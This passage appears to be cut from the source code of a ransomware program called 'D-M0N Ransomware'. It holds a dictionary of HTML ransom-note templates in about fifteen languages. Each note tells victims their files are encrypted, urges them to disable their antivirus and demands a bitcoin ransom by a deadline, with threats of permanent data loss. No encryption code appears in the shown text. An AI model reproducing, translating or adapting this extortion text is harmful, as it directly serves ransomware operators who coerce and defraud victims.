ja armee kasutavad neid :D<br>---<br>Kui olete otsustanud oma faile taastada, järgige palun vasakpoolsel paneelil 'Dekrüpteerimise juhised' olevaid juhiseid, et lunastust õigesti maksta. Pärast maksmist garanteerime, et teie failid dekrüpteeritakse 100%, see viirus eemaldatakse ja saate oma arvutit kasutada nagu enne.</p><p style='font-size: 14px; color: red;'><h5>HOIATUS! Kui proovite seda tarkvara või selle faile kustutada või oma faile lunastust maksmata dekrüpteerida, jäävad teie failid krüpteerituks ja te ei näe neid kunagi enam!</h5></p></div>",
        "FI": f"<div style='overflow: auto;'><h5>Mikä tämä on?</h5><p style='font-size: 10px;'>Olet ollut <b>D-M0N Ransomware</b> -viruksen uhri! Tiedostosi on salattu (joten nyt käyttökelvottomia) käyttämällä <b>AES-256</b> (CBC-tila) ja <b>RSA-2048</b>, jotka ovat <b>military grade encryption algorithms</b>. Tiedostojesi palauttamiseksi sinun on noudatettava alla olevia ohjeita.</p><h5>Kuinka voin palauttaa tiedostoni?</h5><p style='font-size: 10px;'>Ennen kaikkea, poista virustorjuntasi käytöstä, koska jos se on käytössä, se voi poistaa tämän ohjelman, ja tiedostosi ovat <b>ikuisesti kadonneet</b>.<br>Virustorjuntasi on nyt poistettu käytöstä? Hyvä, aloitetaan: tämä on <b>RANSOMWARE</b>, joten jos haluat palauttaa tiedostosi, sinun on maksettava meille <b>RANSOM</b> <b>bitcoinissa</b>, joka on tällä hetkellä <b>{BTC_RANSOM} BTC</b> (tarkista bitcoinin nykyinen hinta).<br><b style='color: red;'>Sinulla on {MAX_DAYS_TO_PAY} päivää aikaa maksaa (laskuri alkoi siitä hetkestä, kun tiedostot salattiin), 5 päivän kuluttua tiedostosi katoavat pysyvästi etkä koskaan voi palauttaa niitä. EI KOSKAAN.</b><br>Muista, että jos päätät olla maksamatta lunnaita, et voi palauttaa tiedostojasi, koska vain meillä on yksityinen avain (joka voi purkaa tiedostot) ja käytämme maailman turvallisimpia salausalgoritmeja, jopa salaiset palvelut ja armeija käyttävät niitä :D<br>---<br>Jos olet päättänyt palauttaa tiedostosi, seuraa ohjeita 'Purkaminen ohjeet' -paneelissa vasemmalla maksaa oikein lunnaat. Kun olet maksanut, takaamme, että tiedostosi puretaan 100 %, tämä virus poistetaan ja voit käyttää tietokonettasi kuten ennenkin.</p><p style='font-size: 14px; color: red;'><h5>VAROITUS! Jos yrität poistaa tätä ohjelmistoa tai sen tiedostoja tai purkaa tiedostojasi ilman lunnaiden maksamista, tiedostosi pysyvät salattuina etkä koskaan näe niitä uudelleen!</h5></p></div>",
        "FR": f"<div style='overflow: auto;'><h5>Qu'est-ce que c'est que ça ?</h5><p style='font-size: 10px;'>Vous avez été victime du virus <b>D-M0N Ransomware</b> ! Vos fichiers ont été cryptés (donc désormais inutilisables) en utilisant <b>AES-256</b> (mode CBC) et <b>RSA-2048</b>, qui sont <b>des algorithmes de cryptage de sécurité militaire</b>. Pour récupérer vos fichiers, vous devrez suivre les instructions ci-dessous.</p><h5>Comment puis-je récupérer mes fichiers ?</h5><p style='font-size: 10px;'>Tout d'abord, veuillez désactiver votre antivirus, car s'il est activé, il pourrait supprimer ce programme et vos fichiers seront <b>perdus à jamais</b>.<br>Votre antivirus est maintenant désactivé ? Très bien, commençons : ceci est un <b>RANSOMWARE</b>, donc si vous voulez récupérer vos fichiers, vous devrez nous payer une <b>RANÇON</b> en <b>bitcoin</b>, qui est actuellement de <b>{BTC_RANSOM} BTC</b> (veuillez vérifier le prix actuel du Bitcoin).<br><b style='color: red;'>Vous avez {MAX_DAYS_TO_PAY} jours pour payer (le compte à rebours a commencé au moment où les fichiers ont été cryptés). Après ces 5 jours, vos fichiers seront définitivement perdus et vous ne pourrez plus JAMAIS les récupérer. PLUS JAMAIS.</b><br>Rappelez-vous : si vous choisissez de ne pas payer la rançon, vous ne pourrez pas non plus récupérer vos fichiers, car la clé est détenue par nous uniquement et nous utilisons les algorithmes de cryptage les plus sûrs au monde, utilisés par les services secrets et l'armée :D<br>---<br>Si vous choisissez de récupérer vos fichiers, veuillez suivre les instructions dans la zone 'Instructions de décryptage' à gauche pour payer correctement la rançon. Après avoir payé, nous garantissons que vos fichiers seront décryptés à 100 %, ce virus sera supprimé et vous pourrez utiliser votre ordinateur comme avant.</p><p style='font-size: 14px; color: red;'><h5>ATTENTION ! Si vous essayez de supprimer ce logiciel ou ses fichiers ou de décrypter vos fichiers sans payer la rançon, vos fichiers resteront encryptés et vous n'allez plus jamais pouvoir les ouvrir !</h5></p></div>",
        "HI": f"<div style='overflow: auto;'><h5>यह क्या है?</h5><p style='font-size: 10px;'>आप <b>D-M0N Ransomware</b> वायरस के शिकार हो गए हैं! आपकी फ़ाइलों को <b>AES-256</b> (CBC मोड) और <b>RSA-2048</b> का उपयोग करके एन्क्रिप्ट किया गया है, जो <b>सैन्य ग्रेड एन्क्रिप्शन एल्गोरिदम</b> हैं। अपनी फ़ाइलों को पुनर्प्राप्त करने के लिए, आपको नीचे दिए गए निर्देशों का पालन करना होगा।</p><h5>मैं अपनी फ़ाइलों को कैसे पुनर्प्राप्त कर सकता हूँ?</h5><p style='font-size: 10px;'>सबसे पहले, कृपया अपना एंटीवायरस बंद करें, क्योंकि यदि यह चालू है, तो यह इस प्रोग्राम को हटा सकता है और आपकी फ़ाइलें <b>सदा के लिए खो जाएँगी</b>.<br>क्या आपका एंटीवायरस अब बंद है? ठीक है, चलो शुरू करते हैं: यह एक <b>RANSOMWARE</b> है, इसलिए यदि आप अपनी फ़ाइलों को पुनर्प्राप्त करना चाहते हैं, तो आपको हमें <b>बिटकॉइन</b> में <b>रिहाई</b> का भुगतान करना होगा, जो वर्तमान में <b>{BTC_RANSOM} BTC</b> है (कृपया बिटकॉइन की वर्तमान कीमत की जांच करें)।<br><b style='color: red;'>आपके पास भुगतान करने के लिए {MAX_DAYS_TO_PAY} दिन हैं (गिनती उस क्षण से शुरू हुई जब फ़ाइलें एन्क्रिप्ट की गई थीं), 5 दिन बीतने के बाद आपकी फ़ाइलें स्थायी रूप से खो जाएँगी और आप उन्हें कभी भी पुनर्प्राप्त नहीं कर पाएंगे। कभी भी नहीं.</b><br>कृपया याद रखें कि यदि आप फिरौती का भुगतान करने का निर्णय लेते हैं, तो आप अपनी फ़ाइलों को पुनर्प्राप्त नहीं कर सकते, क्योंकि केवल हमारे पास निजी कुंजी है (जो फ़ाइलों को डिक्रिप्ट कर सकती है) और हम दुनिया के सबसे सुरक्षित एन्क्रिप्शन एल्गोरिदम का उपयोग करते हैं, यहां तक कि गुप्त सेवाएँ और सेना भी इसका उपयोग करती हैं :D<br>---<br>यदि आपने अपनी फ़ाइलों को पुनर्प्राप्त करने का निर्णय लिया है, तो कृपया बाईं ओर 'डिक्रिप्शन निर्देश' पैनल पर दिए गए निर्देशों का पालन करें ताकि सही तरीके से फिरौती का भुगतान किया जा सके। जब आप इसका भुगतान करेंगे, तो हम सुनिश्चित करते हैं कि आपकी फ़ाइलें 100% डिक्रिप्ट की जाएँगी, यह वायरस हटा दिया जाएगा और आप अपने कंप्यूटर का उपयोग पहले की तरह कर सकेंगे।</p><p style='font-size: 14px; color: red;'><h5>चेतावनी! यदि आप बिना फिरौती का भुगतान किए इस सॉफ़्टवेयर या इसकी फ़ाइलों को हटाने या अपनी फ़ाइलों को डिक्रिप्ट करने की कोशिश करते हैं, तो आपकी फ़ाइलें एन्क्रिप्टेड रहेंगी और आप उन्हें फिर कभी नहीं देख पाएँगे!</h5></p></div>",
        "HR": f"<div style='overflow: auto;'><h5>Što je to?</h5><p style='font-size: 10px;'>Postali ste žrtva virusa <b>D-M0N Ransomware</b>! Vaši su datoteke kriptirani (tako da sada nisu upotrebljivi) koristeći <b>AES-256</b> (CBC način) i <b>RSA-2048</b>, koji su <b>vojni algoritmi šifriranja</b>. Da biste povratili svoje datoteke, morate slijediti upute u nastavku.</p><h5>Kako mogu povratiti svoje datoteke?</h5><p style='font-size: 10px;'>Prije svega, molimo vas da onemogućite svoj antivirus, jer ako je uključen, može izbrisati ovaj program i vaši će datoteke biti <b>zauvijek izgubljeni</b>.<br>Je li vaš antivirus sada onemogućen? U redu, krenimo: ovo je <b>RANSOMWARE</b>, pa ako želite povratiti svoje datoteke, trebate nam platiti <b>OTKUP</b> u <b>bitcoinu</b>, koji trenutno iznosi <b>{BTC_RANSOM} BTC</b> (molimo provjerite trenutnu cijenu bitcoina).<br><b style='color: red;'>Imate {MAX_DAYS_TO_PAY} dana da platite (odbrojavanje je počelo u trenutku kada su datoteke kriptirane), nakon 5 dana vaše datoteke će trajno biti izgubljene i nikada ih nećete moći povratiti. NIKADA.</b><br>Zapamtite da ako se odlučite ne platiti otkupninu, nećete moći povratiti svoje datoteke, jer samo mi imamo privatni ključ (koji može dešifrirati datoteke) i koristimo najsigurnije algoritme šifriranja na svijetu, čak i tajne službe i vojska ih koriste :D<br>---<br>Ako ste se odlučili povratiti svoje datoteke, slijedite upute na 'Upute za dešifriranje' panelu lijevo da ispravno platite otkup. Nakon što platite, jamčimo da će vaši datoteci biti 100% dešifrirani, ovaj virus će biti uklonjen i moći ćete koristiti svoje računalo kao prije.</p><p style='font-size: 14px; color: red;'><h5>UPWARNING! Ako pokušate izbrisati ovaj softver ili njegove datoteke ili dešifrirati svoje datoteke bez plaćanja otkupnine, vaše datoteke će ostati šifrirane i nikada ih više nećete vidjeti!</h5></p></div>",
        "HU": f"<div style='overflow: auto;'><h5>Mi ez?</h5><p style='font-size: 10px;'>Ön a <b>D-M0N Ransomware</b> vírus áldozata lett! A fájljait titkosították (ezért most használhatatlanok) <b>AES-256</b> (CBC mód) és <b>RSA-2048</b> segítségével, amelyek <b>katonai szintű titkosító algoritmusok</b>. A fájlok visszaszerzéséhez kövesse az alábbi utasításokat.</p><h5>Hogyan tudom visszaszerezni a fájljaimat?</h5><p style='font-size: 10px;'>Először is, kérjük, tiltsa le az antivírust, mert ha be van kapcsolva, törölheti ezt a programot, és a fájljai <b>örökre elvesznek</b>.<br>Az antivírus most le van tiltva? Rendben, kezdjük el: ez egy <b>RANSOMWARE</b>, tehát ha vissza szeretné szerezni a fájljait, <b>váltságdíjat</b> kell fizetnie nekünk <b>bitcoinban</b>, amely jelenleg <b>{BTC_RANSOM} BTC</b> (kérjük, ellenőrizze a Bitcoin aktuális árát).<br><b style='color: red;'>Önnek {MAX_DAYS_TO_PAY} napja van a fizetésre (a visszaszámlálás a fájlok titkosításának pillanatában kezdődött), 5 nap elteltével a fájljai véglegesen elvesznek, és SOHA nem tudja őket visszaszerezni. SOHA.</b><br>Kérjük, ne feledje, hogy ha úgy dönt, hogy nem fizeti ki a váltságdíjat, akkor sem tudja visszaszerezni a fájljait, mert csak nekünk van a privát kulcs (ami dekódolni tudja a fájlokat), és a világ legbiztonságosabb titkosító algoritmusait használjuk, amelyeket még a titkos szolgálatok és a hadsereg is használnak :D<br>---<br>Ha úgy döntött, hogy visszaszerzi a fájljait, kérjük, kövesse az 'Dekódolási utasítások' panel utasításait balra, hogy helyesen fizesse ki a váltságdíjat. Miután kifizette, garantáljuk, hogy a fájljai 100%-ban dekódolva lesznek, ez a vírus törlődése, és ugyanúgy használhatja a számítógépét, mint korábban.</p><p style='font-size: 14px; color: red;'><h5>FIGYELEM! Ha megpróbálja törölni ezt a szoftvert vagy annak fájljait, vagy dekódolni a fájljait anélkül, hogy kifizetné a váltságdíjat, a fájljai titkosítva maradnak, és soha többé nem fogja őket látni!</h5></p></div>",
        "ID": f"<div style='overflow: auto;'><h5>Apa itu?</h5><p style='font-size: 10px;'>Anda telah menjadi korban virus <b>D-M0N Ransomware</b>! File Anda telah dienkripsi (jadi sekarang tidak dapat digunakan) menggunakan <b>AES-256</b> (mode CBC) dan <b>RSA-2048</b>, yang merupakan <b>algoritma enkripsi tingkat militer</b>. Untuk memulihkan file Anda, Anda harus mengikuti instruksi di bawah ini.</p><h5>Bagaimana cara memulihkan file saya?</h5><p style='font-size: 10px;'>Pertama-tama, harap matikan antivirus Anda, karena jika diaktifkan, itu dapat menghapus program ini dan file Anda akan <b>hilang selamanya</b>.<br>Apakah antivirus Anda sekarang sudah dimatikan? Baiklah, mari kita mulai: ini adalah <b>RANSOMWARE</b>, jadi jika Anda ingin memulihkan file Anda, Anda harus membayar kami <b>TEBUSAN</b> dalam <b>bitcoin</b>, yang saat ini adalah <b>{BTC_RANSOM} BTC</b> (silakan periksa harga Bitcoin saat ini).<br><b style='color: red;'>Anda memiliki {MAX_DAYS_TO_PAY} hari untuk membayar (penghitungan mundur dimulai pada saat file dienkripsi), setelah 5 hari file Anda akan hilang selamanya dan Anda tidak akan PERNAH bisa memulihkannya. TIDAK PERNAH.</b><br>Silakan ingat bahwa jika Anda memilih untuk tidak membayar tebusan, Anda juga tidak akan dapat memulihkan file Anda, karena hanya kami yang memiliki kunci pribadi (yang dapat mendekripsi file) dan kami menggunakan algoritma enkripsi teraman di dunia, bahkan layanan rahasia dan militer menggunakannya :D<br>---<br>Jika Anda memilih untuk memulihkan file Anda, silakan ikuti instruksi di panel 'Instruksi Dekripsi' di sebelah kiri untuk membayar tebusan dengan benar. Setelah Anda membayarnya, kami menjamin file Anda akan terdekripsi 100%, virus ini akan dihapus dan Anda akan dapat menggunakan komputer Anda seperti sebelumnya.</p><p style='font-size: 14px; color: red;'><h5>PERINGATAN! Jika Anda mencoba menghapus perangkat lunak ini atau file-filenya atau mendekripsi file Anda tanpa membayar tebusan, file Anda akan tetap terenkripsi dan Anda tidak akan pernah bisa melihatnya lagi!</h5></p></div>",
        "IT": f"<div style='overflow: auto;'><h5>Che cos'è?</h5><p style='font-size: 10px;'>Sei stato vittima del virus <b>D-M0N Ransomware</b>! I tuoi file sono stati crittografati (quindi ora inutilizzabili) utilizzando <b>AES-256</b> (modalità CBC) e <b>RSA-2048</b>, che sono <b>algoritmi di crittografia di grado militare</b>. Per recuperare i tuoi file, dovrai seguire le istruzioni qui sotto.</p><h5>Come posso recuperare i miei file?</h5><p style='font-size: 10px;'>Prima di tutto, ti preghiamo di disattivare il tuo antivirus, perché se è attivato potrebbe eliminare questo programma e i tuoi file saranno <b>persi per sempre</b>.<br>Il tuo antivirus è ora disattivato? Va bene, iniziamo: questo è un <b>RANSOMWARE</b>, quindi se vuoi recuperare i tuoi file, dovrai pagarci un <b>RISCATTO</b> in <b>bitcoin</b>, che attualmente è <b>{BTC_RANSOM} BTC</b> (controlla il prezzo attuale del Bitcoin).<br><b style='color: red;'>Hai {MAX_DAYS_TO_PAY} giorni per pagare (il conto alla rovescia è iniziato nel momento in cui i file sono stati crittografati), dopo 5 giorni i tuoi file saranno persi per sempre e non potrai MAI recuperarli. MAI.</b><br>Ricorda che se decidi di non pagare il riscatto, non potrai recuperare i tuoi file, perché solo noi abbiamo la chiave privata (che può decrittografare i file) e utilizziamo gli algoritmi di crittografia più sicuri al mondo, utilizzati anche dai servizi segreti e dall'esercito :D<br>---<br>Se hai scelto di recuperare i tuoi file, segui le istruzioni nel pannello 'Istruzioni di Decrittazione' a sinistra per pagare correttamente il riscatto. Dopo averlo pagato, garantiamo che i tuoi file saranno decrittografati al 100%, questo virus sarà eliminato e potrai usare il tuo computer come prima.</p><p style='font-size: 14px; color: red;'><h5>ATTENZIONE! Se provi a eliminare questo software o i suoi file o a decrittografare i tuoi file senza pagare il riscatto, i tuoi file rimarranno crittografati e non li vedrai mai più!</h5></p></div>",
        "JA": f"<div style='overflow: auto;'><h5>これは何ですか？</h5><p style='font-size: 10px;'>あなたは<b>D-M0N Ransomware</b>ウイルスの犠牲者です！あなたのファイルは<b>AES-256</b>（CBCモード）および<b>RSA-2048</b>を使用して暗号化されました（したがって、現在は使用できません）。これは<b>軍用グレードの暗号化アルゴリズム</b>です。ファイルを復元するには、以下の指示に従う必要があります。</p><h5>ファイルをどうやって復元できますか？</h5><p style='font-size: 10px;'>まず第一に、アンチウイルスを無効にしてください。無効にしないと、このプログラムが削除され、あなたのファイルは<b>永遠に失われます</b>。<br>アンチウイルスは無効になっていますか？よし、始めましょう: これは<b>RANSOMWARE</b>ですので、ファイルを復元したい場合は、私たちに<b>身代金</b>を<b>ビットコイン</b>で支払う必要があります。現在は<b>{BTC_RANSOM} BTC</b>です（ビットコインの現在の価格を確認してください）。<br><b style='color: red;'>支払うためには{MAX_DAYS_TO_PAY}日あります（ファイルが暗号化された瞬間からカウントが始まります）、5日過ぎるとファイルは永遠に失われ、決して復元できません。決して。</b><br>身代金を支払わない場合、ファイルを復元することはできません。なぜなら、暗号を解除することができるプライベートキーを持っているのは私たちだけだからです。私たちは、世界で最も安全な暗号化アルゴリズムを使用しています。秘密のサービスや軍隊でも使用されています :D<br>---<br>ファイルを復元することを選択した場合は、左側の「復号化手順」パネルの指示に従って、身代金を正しく支払ってください。支払いが完了したら、ファイルが100%復号化され、このウイルスが削除され、以前のようにコンピュータを使用できることを保証します。</p><p style='font-size: 14px; color: red;'><h5>警告！このソフトウェアやそのファイルを削除したり、身代金を支払わずにファイルを復号化しようとすると、ファイルは暗号化されたままとなり、二度と見ることができなくなります！</h5></p></div>",
        "KO": f"<div style='overflow: auto;'><h5>이게 뭐죠?</h5><p style='font-size: 10px;'>당신은 <b>D-M0N Ransomware</b> 바이러스의 희생자가 되었습니다! 당신의 파일은 <b>AES-256</b> (CBC 모드)와 <b>RSA-2048</b>를 사용하여 암호화되었으며, 이는 <b>군사 등급 암호화 알고리즘</b>입니다. 파일을 복구하려면 아래 지침을 따라야 합니다.</p><h5>파일을 어떻게 복구할 수 있나요?</h5><p style='font-size: 10px;'>우선, 바이러스 백신을 비활성화해 주세요. 활성화되어 있으면 이 프로그램을 삭제하고 파일이 <b>영원히 잃어버릴 수 있습니다</b>.<br>바이러스 백신이 이제 비활성화되었나요? 좋습니다, 시작하겠습니다: 이것은 <b>RANSOMWARE</b>입니다. 따라서 파일을 복구하려면 저희에게 <b>비트코인</b>으로 <b>몸값</b>을 지불해야 합니다. 현재 <b>{BTC_RANSOM} BTC</b>입니다 (비트코인의 현재 가격을 확인해 주세요).<br><b style='color: red;'>당신은 {MAX_DAYS_TO_PAY}일 이내에 지불해야 합니다 (파일이 암호화된 순간부터 카운트가 시작됩니다), 5일이 지나면 파일은 영구적으로 잃어버리게 되며, 결코 복구할 수 없습니다. 결코.</b><br>몸값을 지불하지 않기로 선택하면, 파일을 복구할 수 없다는 것을 기억하세요. 왜냐하면 오직 저희만이 파일을 복호화할 수 있는 개인 키를 가지고 있으며, 저희는 세계에서 가장 안전한 암호화 알고리즘을 사용하고 있기 때문입니다. 심지어 비밀 서비스와 군대에서도 사용합니다 :D<br>---<br>파일을 복구하기로 선택했다면, 왼쪽의 '복호화 지침' 패널의 지침을 따라 몸값을 정확히 지불해 주세요. 지불 후, 우리는 당신의 파일이 100% 복호화될 것이라고 보장하며, 이 바이러스는 삭제되고 당신은 이전과 동일하게 컴퓨터를 사용할 수 있습니다.</p><p style='font-size: 14px; color: red;'><h5>경고! 이 소프트웨어나 파일을 삭제하거나 몸값을 지불하지 않고 파일을 복호화하려고 하면, 파일은 암호화된 상태로 남아 영원히 볼 수 없게 됩니다!</h5></p></div>",
        "LT": f"<div style='overflow: auto;'><h5>Kas tai?</h5><p style='font-size: 10px;'>Jūs tapote <b>D-M0N Ransomware</b> viruso auka! Jūsų failai buvo užšifruoti (taigi dabar jie yra nenaudojami) naudojant <b>AES-256</b> (CBC režimas) ir <b>RSA-2048</b>, kurie yra <b>karinės klasės šifravimo algoritmai</b>. Norėdami atkurti savo failus, turite sekti toliau pateiktas instrukcijas.</p><h5>Kaip galiu atkurti savo failus?</h5><p style='font-size: 10px;'>Visų pirma, prašome išjungti savo antivirusinę programą, nes jei ji įjungta, ji gali ištrinti šią programą ir jūsų failai bus <b>amžinai prarasti</b>.<br>Ar jūsų antivirusinė dabar išjungta? Gerai, pradėkime: tai yra <b>RANSOMWARE</b>, todėl jei norite atkurti savo failus, turite sumokėti mums <b>kaitą</b> <b>bitkoinais</b>, kuris šiuo metu yra <b>{BTC_RANSOM} BTC</b> (prašome patikrinti dabartinę Bitcoin kainą).<br><b style='color: red;'>Jūs turite {MAX_DAYS_TO_PAY} dienų sumokėti (skaičiavimas prasidėjo, kai failai buvo užšifruoti), praėjus 5 dienoms, jūsų failai bus amžinai prarasti ir jūs NIKADA jų nebegalėsite atkurti. NIKADA.</b><br>Prašome prisiminti, kad jei nuspręsite nemokėti išpirkos, jūs taip pat negalėsite atkurti savo failų, nes tik mes turime privatų raktą (kuris gali dešifruoti failus) ir mes naudojame saugiausius šifravimo algoritmus pasaulyje, netgi slapti tarnybos ir kariuomenė juos naudoja :D<br>---<br>Jei nusprendėte atkurti savo failus, prašome sekti instrukcijas „Dekodavimo instrukcijose“ kairėje, kad teisingai sumokėtumėte išpirką. Po to, kai sumokėsite, mes garantuojame, kad jūsų failai bus 100% dešifruoti, šis virusas bus pašalintas ir galėsite naudoti savo kompiuterį taip, kaip anksčiau.</p><p style='font-size: 14px; color: red;'><h5>ĮSPĖJIMAS! Jei bandysite ištrinti šią programinę įrangą ar jos failus arba dešifruoti failus be išpirkos sumokėjimo, jūsų failai liks užšifruoti ir jūs jų niekada daugiau nematysite!</h5></p></div>",
        "LV": f"<div style='overflow: auto;'><h5>Kas tas ir?</h5><p style='font-size: 10px;'>Jūs esat <b>D-M0N Ransomware</b> vīrusa upuris! Jūsu faili ir šifrēti (tātad tagad tie nav izmantojami) izmantojot <b>AES-256</b> (CBC režīms) un <b>RSA-2048</b>, kas ir <b>militārās pakāpes šifrēšanas algoritmi</b>. Lai atgūtu savus failus, jums jāseko tālāk sniegtajiem norādījumiem.</p><h5>Kā es varu atgūt savus failus?</h5><p style='font-size: 10px;'>Pirmkārt, lūdzu, atspējojiet savu antivīrusu, jo, ja tas ir aktivizēts, tas var dzēst šo programmu, un jūsu faili tiks <b>uz visiem laikiem zaudēti</b>.<br>Jūsu antivīruss tagad ir atspējots? Labi, sāksim: tas ir <b>RANSOMWARE</b>, tāpēc, ja vēlaties atgūt savus failus, jums jāapmaksā mums <b>izpirkuma maksa</b> <b>bitkoinos</b>, kas pašlaik ir <b>{BTC_RANSOM} BTC</b> (lūdzu, pārbaudiet pašreizējo Bitcoin cenu).<br><b style='color: red;'>Jums ir {MAX_DAYS_TO_PAY} dienas, lai samaksātu (skaitīšana sākās tajā brīdī, kad faili tika šifrēti), pēc 5 dienām jūsu faili tiks pastāvīgi zaudēti un jūs nekad vairs nevarēsiet tos atgūt. NIKAD.</b><br>Lūdzu, atcerieties, ka, ja nolemjat nemaksāt izpirkumu, jūs arī nevarēsiet atgūt savus failus, jo tikai mums ir privātats atslēga (kas var atšifrēt failus), un mēs izmantojam drošākās šifrēšanas algoritmus pasaulē, pat slepenās aģentūras un armija to izmanto :D<br>---<br>Ja esat nolēmis atgūt savus failus, lūdzu, sekojiet norādījumiem sadaļā 'Atšifrēšanas norādījumi' pa kreisi, lai pareizi samaksātu izpirkumu. Pēc samaksāšanas mēs garantējam, ka jūsu faili tiks 100% atšifrēti, šis vīruss tiks dzēsts un jūs varēsiet izmantot datoru tāpat kā iepriekš.</p><p style='font-size: 14px; color: red;'><h5>BRĪDINĀJUMS! Ja mēģināsiet izdzēst šo programmatūru vai tās failus vai atšifrēt savus failus, nemaksājot izpirkumu, jūsu faili paliks šifrēti un jūs nekad vairs tos neredzēsiet!</h5></p></div>",
        "MN": f"<div style='overflow: auto;'><h5>Энэ юу вэ?</h5><p style='font-size: 10px;'>Та <b>D-M0N Ransomware</b> вирусын хохирогч болсон байна! Таны файлууд <b>AES-256</b> (CBC горим) болон <b>RSA-2048</b> ашиглан шифрлэгдсэн (тиймээс одоо ашиглах боломжгүй байна) бөгөөд энэ нь <b>цэргийн зэрэглэлийн шифрлэлт алгоритмууд</b> юм. Файлуудаа сэргээхийн тулд доорх зааврыг дагаж мөрдөх шаардлагатай.</p><h5>Файлуудаа хэрхэн сэргээж болох вэ?</h5><p style='font-size: 10px;'>Юуны өмнө, антивирусаа унтраа, учир нь хэрэв идэвхтэй бол энэ програмыг устгаж, таны файлууд <b>хэзээ ч алддаг</b>.<br>Таны антивирус одоо унтарсан уу? Сайн, эхэлцгээе: энэ нь <b>RANSOMWARE</b> юм, тиймээс хэрэв та файлуудаа сэргээхийг хүсч байвал бидэнд <b>биткоиноор</b> <b>нэхэмжлэл</b> төлөх хэрэгтэй, одоогоор <b>{BTC_RANSOM} BTC</b> байна (биткоины одоогийн үнийг шалгаарай).<br><b style='color: red;'>Танд {MAX_DAYS_TO_PAY} хоногийн дотор төлөх шаардлагатай (файлууд шифрлэгдсэн мөчөөс эхэлсэн), 5 хоног өнгөрсний дараа таны файлууд үүрд алдагдах бөгөөд та ХЭЗЭЭ ч сэргээж чадахгүй. ХЭЗЭЭ ч.</b><br>Хэрэв та нэхэмжлэлийг төлөхгүй гэж шийдсэн бол, таны файлуудыг сэргээж чадахгүй гэдгийг санаарай, учир нь зөвхөн бидэнд (файлуудыг тайлах боломжтой) хувийн түлхүүр бий, бид дэлхийн хамгийн аюулгүй шифрлэх алгоритмуудыг ашиглаж байна, тэдгээрийг нууц үйлчилгээ болон армид ч ашигладаг :D<br>---<br>Хэрэв та файлуудаа сэргээх гэж шийдсэн бол, 'Тайлах заавар' самбараас зааврыг даган нэхэмжлэлийг зөв төлнө үү. Төлсний дараа бид таны файлууд 100% тайлагдсаныг баталгаажуулж, энэхүү вирусыг устгаж, таны компьютерийг өмнөх шигээ ашиглах боломжтой болно.</p><p style='font-size: 14px; color: red;'><h5>АНХААРУУЛГА! Энэ програмыг устгах, эсвэл файлуудыг тайлах эсвэл нэхэмжлэлийг төлөлгүйгээр файлуудаа тайлах гэж оролдох юм бол, файлууд тань шифрлэгдсэн хэвээр үлдэж, та дахин хэзээ ч харахгүй!</h5></p></div>",
        "NL": f"<div style='overflow: auto;'><h5>Wat is dit?</h5><p style='font-size: 10px;'>U bent het slachtoffer geworden van de <b>D-M0N Ransomware</b> virus! Uw bestanden zijn versleuteld (dus nu onbruikbaar) met behulp van <b>AES-256</b> (CBC-modus) en <b>RSA-2048</b>, wat <b>militaire grade versleutelingsalgoritmen</b> zijn. Om uw bestanden te herstellen, moet u de onderstaande instructies volgen.</p><h5>Hoe kan ik mijn bestanden herstellen?</h5><p style='font-size: 10px;'>Ten eerste, schakel alstublieft uw antivirus uit, want als deze is ingeschakeld, kan deze dit programma verwijderen en zullen uw bestanden <b>voor altijd verloren gaan</b>.<br>Is uw antivirus nu uitgeschakeld? Goed, laten we beginnen: dit is een <b>RANSOMWARE</b>, dus als u uw bestanden wilt herstellen, moet u ons een <b>losgeld</b> betalen in <b>bitcoin</b>, dat momenteel <b>{BTC_RANSOM} BTC</b> is (controleer de huidige prijs van Bitcoin).<br><b style='color: red;'>U heeft {MAX_DAYS_TO_PAY} dagen om te betalen (de aftelling begon op het moment dat de bestanden werden versleuteld), na 5 dagen worden uw bestanden permanent verloren en kunt u ze NOOIT meer herstellen. NOOIT.</b><br>Vergeet niet dat als u besluit het losgeld niet te betalen, u ook uw bestanden niet kunt herstellen, omdat alleen wij de privésleutel hebben (die de bestanden kan ontsleutelen) en wij de veiligste versleutelingsalgoritmen ter wereld gebruiken, die zelfs door geheime diensten en het leger worden gebruikt :D<br>---<br>Als u ervoor kiest uw bestanden te herstellen, volg dan de instructies in het 'Ontsleutelingsinstructies' paneel aan de linkerkant om het losgeld correct te betalen. Nadat u heeft betaald, garanderen we dat uw bestanden 100% worden ontsleuteld, deze virus zal worden verwijderd en u kunt uw computer weer gebruiken zoals voorheen.</p><p style='font-size: 14px; color: red;'><h5>WAARSCHUWING! Als u probeert deze software of de bestanden ervan te verwijderen of uw bestanden te ontsleutelen zonder het losgeld te betalen, blijven uw bestanden versleuteld en zult u ze nooit meer zien!</h5></p></div>",
        "PL": f"<div style='overflow: auto;'><h5>Co to jest?</h5><p style='font-size: 10px;'>Stałeś się ofiarą wirusa <b>D-M0N Ransomware</b>! Twoje pliki zostały zaszyfrowane (więc teraz są bezużyteczne) przy użyciu <b>AES-256</b> (tryb CBC) i <b>RSA-2048</b>, które są <b>algorytmami szyfrowania na poziomie wojskowym</b>. Aby odzyskać swoje pliki, musisz postępować zgodnie z poniższymi instrukcjami.</p><h5>Jak mogę odzyskać moje pliki?</h5><p style='font-size: 10px;'>Po pierwsze, proszę wyłączyć swój program antywirusowy, ponieważ jeśli jest włączony, może usunąć ten program, a twoje pliki zostaną <b>na zawsze utracone</b>.<br>Czy twój program antywirusowy jest teraz wyłączony? Dobrze, zaczynamy: to jest <b>RANSOMWARE</b>, więc jeśli chcesz odzyskać swoje pliki, musisz nam zapłacić <b>okup</b> w <b>bitcoinach</b>, który obecnie wynosi <b>{BTC_RANSOM} BTC</b> (proszę sprawdzić aktualną cenę bitcoina).<br><b style='color: red;'>Masz {MAX_DAYS_TO_PAY} dni na zapłatę (odliczanie zaczęło się w momencie szyfrowania plików), po 5 dniach twoje pliki zostaną na zawsze utracone i NIGDY ich nie odzyskasz. NIGDY.</b><br>Proszę pamiętać, że jeśli zdecydujesz się nie płacić okupu, również nie będziesz mógł odzyskać swoich plików, ponieważ tylko my mamy klucz prywatny (który może odszyfrować pliki) i używamy najbezpieczniejszych algorytmów szyfrowania na świecie, które są nawet wykorzystywane przez służby specjalne i armię :D<br>---<br>Jeśli zdecydujesz się odzyskać swoje pliki, proszę postępować zgodnie z instrukcjami w panelu 'Instrukcje odszyfrowania' po lewej stronie, aby poprawnie zapłacić okup. Po zapłacie gwarantujemy, że twoje pliki zostaną odszyfrowane w 100%, ten wirus zostanie usunięty, a ty będziesz mógł używać swojego komputera tak jak wcześniej.</p><p style='font-size: 14px; color: red;'><h5>OSTRZEŻENIE! Jeśli spróbujesz 